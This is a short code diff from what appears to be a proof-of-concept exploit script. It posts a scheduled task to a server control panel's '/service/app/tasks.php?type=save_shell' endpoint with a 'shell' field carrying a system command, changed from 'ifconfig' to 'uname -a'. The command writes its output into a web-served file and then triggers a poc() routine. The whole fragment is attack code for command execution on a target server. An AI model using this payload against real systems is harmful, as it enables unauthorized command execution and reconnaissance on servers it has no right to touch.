@@ -29,7 +29,7 @@ function save(){
   data.day="3";
   data.hour="13";
   data.minute = "51";
-  data.shell="ifconfig >/www/admin/localhost_80/wwwroot/1.txt";
+  data.shell="uname -a>/www/admin/localhost_80/wwwroot/1.txt";
   $.post('/service/app/tasks.php?type=save_shell',data,function(res){
     poc();
   },'json');
